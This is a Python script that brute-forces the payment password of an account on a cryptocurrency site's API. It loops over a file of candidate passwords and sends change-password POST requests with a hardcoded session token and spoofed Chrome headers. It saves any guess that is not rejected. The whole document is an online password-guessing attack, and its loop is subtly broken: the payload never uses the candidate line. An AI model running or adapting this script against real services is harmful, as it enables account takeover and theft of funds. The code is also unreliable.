import http.client
import json
import zlib

# Define the connection and request details
conn = http.client.HTTPSConnection("api.coinsus.top")

# Define the headers
headers = {
    "Host": "api.coinsus.top",
    "Sec-Ch-Ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "Accept-Language": "en",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Platform": "H5",
    "Token": "572ae635-06f3-4dc6-9bbf-4652470e7893",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept": "*/*",
    "Origin": "https://crydnn.com",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://crydnn.com/",
    "Accept-Encoding": "gzip, deflate, br",  # Note this line
    "Priority": "u=1, i"
}



with open('password_combinations.txt', 'r') as file:
    # Loop through each line in the file
    for line in file:
        # Print the current line # .strip() removes leading/trailing whitespace, including newlines
        payload = {
            "newPassword": "Galib@123",
            "confirmPassword": "Galib@123",
            "walletAddress": "",
            "paymentPassword": f"sadfs",
            "type": "1"
        }

        # Convert the payload to JSON
        json_payload = json.dumps(payload)

        # Send the POST request
        conn.request("POST", "/addons/cos/user/changePwd?lang=", body=json_payload, headers=headers)

        # Get the response
        response = conn.getresponse()

        # Read the response
        response_data = response.read()

        # Decompress if gzip or deflate
        encoding = response.getheader('Content-Encoding')
        if encoding == 'gzip':
            response_data = zlib.decompress(response_data, 16 + zlib.MAX_WBITS)
        elif encoding == 'deflate':
            response_data = zlib.decompress(response_data)

        # Close the connection
        conn.close()

        # Print the status and response data

        key = response_data.decode('utf-8')
        response_dict = json.loads(key)
        result = str(response_dict["msg"])
        if result == "Incorrect payment password":
            print(result+": "+line.strip())
        else:
            print(result+": "+line.strip())
            with open("Found Password: ", "w") as file:
                file.write(line.strip())
        